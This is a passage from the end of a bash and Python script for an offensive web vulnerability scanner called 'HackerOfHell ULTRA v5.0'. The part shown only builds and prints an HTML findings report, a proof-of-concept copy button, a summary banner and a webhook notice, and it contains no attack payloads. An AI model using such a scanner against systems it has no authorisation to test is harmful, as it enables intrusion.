      <div class="count-item"><div class="count-num" style="color:#30d158">{stats.get('low',0)}</div><div class="count-lbl">LOW</div></div>
      <div class="count-item"><div class="count-num" style="color:#bf5af2">{len(chains)}</div><div class="count-lbl">CHAINS</div></div>
    </div>
  </div>
  <div class="stat-box">
    <div class="stat-title">SCAN DETAILS</div>
    <div style="font-size:.68rem;color:var(--m);line-height:2.2">
      Tool: <span style="color:#7ee787">HackerOfHell ULTRA v5.0</span><br>
      Author: <span style="color:#7ee787">{author}</span><br>
      Handle: <span style="color:#ff2d55;font-weight:700">{handle}</span><br>
      Phases: <span style="color:#7ee787">20 automated phases</span><br>
      Techniques: <span style="color:#7ee787">80+ attack vectors</span><br>
      Verified: <span style="color:#7ee787">All confirmed bugs only</span>
    </div>
  </div>
</div>

{"<div class='section-title' style='margin-bottom:10px'>⛓ VULNERABILITY CHAINS — ESCALATION PATHS</div>" + chtml + "<br>" if chains else ""}

<div class="section-title">CONFIRMED FINDINGS — SORTED BY SEVERITY</div>
{fhtml if fhtml else '<div style="color:var(--m);padding:40px;text-align:center;border:1px solid var(--b2)">No confirmed vulnerabilities. Target appears well-hardened.</div>'}

<div class="report-footer">
  <div class="footer-logo">⚡ HACKEROFHELL ULTRA v5.0</div>
  <div>Author: {author} | Handle: {handle}</div>
  <div>Target: {target} | Date: {date_str} | Mode: {mode_str}</div>
  <div style="margin-top:8px;color:var(--b2)">CONFIDENTIAL — For authorized use only. Generated by HackerOfHell ULTRA v5.0</div>
</div>

</div>
<script>
const pocs={pocs_json};
function tog(i){{
  const b=document.getElementById('fb'+i);
  const a=document.getElementById('arr'+i);
  b.style.display=b.style.display==='block'?'none':'block';
  a.style.transform=b.style.display==='block'?'rotate(180deg)':'';
}}
function cpPoc(i,e){{
  e.stopPropagation();
  navigator.clipboard.writeText(pocs[i]||'').catch(()=>{{}});
  const btn=e.target;
  btn.textContent='✓ COPIED';
  setTimeout(()=>btn.textContent='⎘ COPY PoC',2000);
}}
</script>
</body></html>"""

report_path = os.path.expandvars('$REPORT')
with open(report_path, 'w') as f:
    f.write(html)
print(f"\n[✓] Report written: {report_path}")
PYEOF

# ══════════════════════════════════════════════════════════════════════
# FINAL SUMMARY
# ══════════════════════════════════════════════════════════════════════
STATS=$(python3 -c "
import json
try:
  d=json.load(open('$FINDINGS'))
  s=d.get('stats',{})
  print(f\"{s.get('total',0)} {s.get('critical',0)} {s.get('high',0)} {s.get('medium',0)} {s.get('low',0)} {len(d.get('chains',[]))}\")
except: print('0 0 0 0 0 0')
" 2>/dev/null)
read -r TOTAL CRIT HIGH MED LOW CHAINS <<< "$STATS"

clear
echo -e "${BRED}${BOLD}"
cat << 'ENDBANNER'
  ╔══════════════════════════════════════════════════════════════════════════╗
  ║                                                                          ║
  ║     ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗  ██████╗ ██╗       ║
  ║     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔═══██╗██║       ║
  ║     ███████║███████║██║     █████╔╝ █████╗  ██████╔╝██║   ██║██║       ║
  ║     ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗██║   ██║╚═╝       ║
  ║     ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║╚██████╔╝██╗       ║
  ║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝       ║
  ║                         ULTRA v5.0 — SCAN COMPLETE                      ║
  ╚══════════════════════════════════════════════════════════════════════════╝
ENDBANNER
echo -e "${NC}"
echo -e "  ${MAG}${BOLD}Author   :${NC} ${WHT}RAJESH BAJIYA${NC}"
echo -e "  ${MAG}${BOLD}Handle   :${NC} ${BRED}${BOLD}HACKEROFHELL${NC}"
echo -e "  ${MAG}${BOLD}Target   :${NC} ${BGRN}${BOLD}$TARGET${NC}"
echo ""
echo -e "  ${BRED}${BOLD}CRITICAL :${NC} ${BOLD}$CRIT${NC}"
echo -e "  ${YLW}${BOLD}HIGH     :${NC} ${BOLD}$HIGH${NC}"
echo -e "  ${YLW}MEDIUM   :${NC} $MED"
echo -e "  ${GRN}LOW      :${NC} $LOW"
echo -e "  ${MAG}${BOLD}CHAINS   :${NC} ${BOLD}$CHAINS escalation paths${NC}"
echo -e "  ${CYN}${BOLD}TOTAL    :${NC} ${BOLD}$TOTAL confirmed findings${NC}"
echo ""
echo -e "  ${CYN}OUTPUT   :${NC} $OUTDIR"
echo -e "  ${GRN}${BOLD}REPORT   :${NC} ${BOLD}$REPORT${NC}"
echo ""
echo -e "  ${GRN}firefox $REPORT${NC}"
echo ""
notify_webhook "Scan COMPLETE on $TARGET — $TOTAL findings ($CRIT CRITICAL) | Report ready"
